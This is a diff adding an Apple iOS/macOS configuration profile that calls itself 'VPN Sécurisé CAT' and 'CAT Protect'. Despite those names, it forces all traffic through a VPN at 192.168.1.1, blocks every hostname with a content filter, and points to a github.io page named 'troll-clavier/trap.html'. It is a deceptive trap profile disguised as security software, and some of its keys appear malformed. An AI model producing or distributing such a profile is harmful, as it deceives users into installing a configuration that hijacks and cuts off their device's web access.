@@ -1,0 +1,64 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>PayloadDisplayName</key>
+    <string>VPN Sécurisé CAT</string>
+    <key>PayloadIdentifier</key>
+    <string>com.cat.vpn</string>
+    <key>PayloadType</key>
+    <string>Configuration</string>
+    <key>PayloadVersion</key>
+    <integer>1</integer>
+    <key>PayloadContent</key>
+    <array>
+        <dict>
+            <key>PayloadType</key>
+            <string>com.apple.vpn.managed</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            <key>VPNType</key>
+            <string>L2TP</string>
+            <key>VPNSubType</key>
+            <string>com.apple.vpn.l2tp</string>
+            <key>VPN</key>
+            <dict>
+                <key>RemoteAddress</key>
+                <string>192.168.1.1</string>
+                <key>AuthenticationMethod</key>
+                <string>Password</string>
+                <key>OverridePrimary</key>
+                <true/>
+            </dict>
+        </dict>
+        <dict>
+            <key>PayloadType</key>
+            <string>com.apple.webcontent-filter</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            <key>FilterType</key>
+            <string>com.apple.webcontent-filter.plugin</string>
+            <key>FilterName</key>
+            <string>CAT Security</string>
+            <key>PluginIdentifer</key>
+            <string>com.cat.filter</string>
+            <key>UserDefinedName</key>
+            <string>CAT Protect</string>
+            <key>PayloadContent</key>
+            <dict>
+                <key>FilterSites</key>
+                <array>
+                    <dict>
+                        <key>Allowed</key>
+                        <false/>
+                        <key>Hostname</key>
+                        <string>*</string>
+                    </dict>
+                </array>
+                <key>FilterURL</key>
+                <string>https://raphifouxxx.github.io/troll-clavier/trap.html</string>
+            </dict>
+        </dict>
+    </array>
+</dict>
+</plist>
